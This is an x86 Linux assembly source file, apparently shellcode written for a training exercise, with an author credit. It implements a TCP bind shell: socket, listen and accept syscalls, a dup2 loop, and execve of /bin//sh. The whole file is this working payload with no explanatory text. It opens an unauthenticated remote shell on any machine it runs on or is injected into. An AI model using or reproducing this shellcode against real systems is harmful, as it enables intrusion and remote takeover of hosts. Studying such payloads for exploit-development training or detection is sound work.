; Filename: shell_bind_tcp.nasm
; Author:  Ricardo Ruiz
; Website:  https://ricardojruiz.herokuapp.com/

section .text
	global _start 
_start:
	xor ebx,ebx
	mul ebx
	mov al,0x66
	inc ebx
	push edx
	push ebx
	push byte +0x2
	mov ecx,esp
	int 0x80

	push edx
	push eax
	mov ecx,esp
	mov al,0x66
	mov bl,0x4
	int 0x80
	
	mov al,0x66
	inc ebx
	int 0x80
	
	pop ecx
	xchg eax,ebx

test:
	push byte +0x3f
	pop eax
	int 0x80
	
	dec ecx
	jns test
	mov al,0xb
	push dword 0x68732f2f
	push dword 0x6e69622f
	mov ebx,esp
	inc ecx
	int 0x80
